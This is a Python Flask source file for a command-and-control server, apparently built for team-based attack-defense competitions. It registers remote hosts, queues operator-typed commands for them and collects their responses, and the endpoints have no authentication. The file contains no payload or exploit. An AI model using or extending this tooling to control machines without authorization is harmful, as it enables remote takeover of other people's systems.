#Start a web server
#Take POST requests on /hosts/newHost with an IP and OS
#Assign host with hostname and return the identifier of the host
#Take GET requests on /hosts/IDENTIFIER/commands and return stored commands
#Take POST requests on /hosts/IDENTIFIER/responses and print responses
#Take GET requests on /hosts/IDENTIFIER/checkIn to check-in

#TODO Accept CLI input (API)

from flask import Flask, request
import json
import threading
from serverDependencies.Host import Host
from serverDependencies.Team import Team
from serverDependencies.Hostname import Hostname
from datetime import datetime
import ast

"""
Disable logging for flask.
"""
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__) #Main webpage object

def runApp(SERVER_IP,PORT):
    """
    Runs the website on the specified IP and port.
    """
    app.run(host=f"{SERVER_IP}",port=f"{PORT}")

@app.route("/") #HOMEPAGE
def homePage():
    """
    Returns the homepage at '/'
    """
    return "Homepage of C2"

@app.route("/hosts")
def hostsPage():
    """
    Returns a list of current hosts
    """
    hostString = ""
    for host in HOSTS:
        hostString+=host + "\n"
    return hostString

@app.route("/hosts/<identifier>/commands")
def getCommands(identifier):
    """
    Returns a list of commands for the client to run
    """
    try:
        return HOSTS[identifier].getQueuedCommands()
    except:
        return '{"command_count":"69420"}'

@app.route("/hosts/<identifier>/responses", methods=["POST"])
def getResponse(identifier):
    """
    Accepts a POST request for the client to send responses to.
    """
    data = request.json
    data = json.loads(data,strict=False)
    # data = ast.literal_eval(data)
    cmd_id = data["cmd_id"]
    response = data["response"]
    HOSTS[identifier].addResponse(cmd_id,response)
    debugPrint(f"Host ({identifier}) POST Response - {cmd_id}: {response}")
    return f"{identifier} - Thanks!"

@app.route("/hosts/<identifier>/checkIn",methods=["GET"])
def checkInPage(identifier):
    """
    Runs the check-in function for the host that is checking in.
    """
    checkIn(identifier)
    debugPrint("Successful check-in for host: " + identifier)
    return "Success!"

@app.route("/hosts/newHost", methods=["POST"])
def newHost():
    """
    Takes in data from a POST request and returns an identifier.
    """
    global UNKNOWN_COUNT
    data = request.json
    data = json.loads(data,strict=False)
    IP = data["IP"]
    OS = data["OS"]
    hostname,team = getInfoByIP(IP)
    host_id = hostname + "." + team
    if host_id in HOSTS:
        checkIn(host_id)
        return f"{host_id}"
    if host_id == "unknown.unknown":
        for host in HOSTS:
            if HOSTS[host].ip == IP:
                return host
    UNKNOWN_COUNT += 1
    newHost = Host(IP,OS,hostname,team)
    newHost.id += str(UNKNOWN_COUNT)
    HOSTS[newHost.id] = newHost
    TEAMS["unknown"].hosts.append(newHost)
    debugPrint(f'Unknown host ({IP} - {OS}) - {newHost.id}')
    return f"{newHost.id}"

@app.route("/hosts/<identifier>/addCommand", methods=["POST"])
def addCommand(identifier):
    """
    Takes in a POST request with a command and adds it to the host's queue.
    """
    data = request.json
    debugPrint(f"Adding command: \"{data['command']}\" to host: {identifier}")
    command = data["command"]
    return HOSTS[identifier].addCommand(command) #Returns the command ID

@app.route("/hosts/<identifier>/getResponses")
def getResponses(identifier):
    """
    Returns a list of responses for the host.
    """
    return HOSTS[identifier].getResponses()

def getInfoByIP(IP):
    """
    Returns hostname and team based on expected IP
    """
    for hostname in HOSTNAMES: #Iterate over expected hosts
        for host in HOSTNAMES[hostname].hosts:
            if IP == host.ip: #If the IP is in the clients list, we found the correct host
                return host.hostname, host.team
    return "unknown","unknown"
    
def parseConfig():
    """
    Iterates over 'config.json' and stores necessary information
    """
    try:
        with open("config.json") as config:
            config = json.load(config) #Load the config file
        global NUM_OF_TEAMS
        NUM_OF_TEAMS = int(config["topology"][0]["teams"]) + 1 #Pull the # of all teams
        global SERVER_ADDR
        SERVER_ADDR = config["topology"][0]["serverIP"]
        for i in range(1,NUM_OF_TEAMS): #Create all teams
            TEAMS[str(i)] = Team(str(i))
            debugPrint("Created team: " + str(i))
        TEAMS["unknown"] = Team("unknown") #unknown team for clients that don't fit config
        debugPrint("Created team: " + "unknown")
        for i in range(len(config["hosts"])):
            currentHost = config["hosts"][i]
            createHost(currentHost)
        global UNKNOWN_COUNT
        UNKNOWN_COUNT = 0
    except Exception as e:
        print("Could not parse config file! Please restart C2 with the correct format!\n" + str(e))

def createHost(host):
    """
    Creates a Host object and stores it in HOSTS, TEAMS, and HOSTNAMES.
    """
    hostname = host["hostname"]
    ip = host["ip"]
    os = host["os"]
    HOSTNAMES[hostname] = Hostname(hostname,ip,os)
    for i in range(1,NUM_OF_TEAMS):
        team = str(i)
        expectedHostIP = ip.replace("x",team)
        newHost = Host(expectedHostIP, os, hostname, team)
        HOSTNAMES[hostname].hosts.append(newHost)
        TEAMS[team].hosts.append(newHost)
        HOSTS[newHost.id] = newHost
        debugPrint(f"Added host: {newHost} to TEAM {team}")
        debugPrint(f"Added host: {newHost} to HOSTNAME {hostname}")

def checkIn(hostname):
    """
    Updates host to 'alive' status and updates the last check-in timer.

    :param hostname - Host ID
    """
    host = HOSTS[hostname]
    host.alive = True
    host.lastCheckIn = datetime.now().strftime("%H:%M:%S")

def debugPrint(statement):
    """
    Prints [SERVER] prefixed message if DEBUG is set to True.
    """
    if DEBUG:
        print("[SERVER] " + statement)

def main():
    global DEBUG
    DEBUG = True
    global TEAMS
    TEAMS = dict()
    global HOSTNAMES
    HOSTNAMES = dict()
    global HOSTS
    HOSTS = dict()
    parseConfig()
    website = threading.Thread(target=runApp,args=[SERVER_ADDR,"8080"])
    website.daemon = True
    website.start()
    while 1:
        command = input()
        # HOSTS["unknown.unknown1"].addCommand(command)
        for host in TEAMS["unknown"].hosts:
            host.addCommand(command)

if __name__ == "__main__":
    main()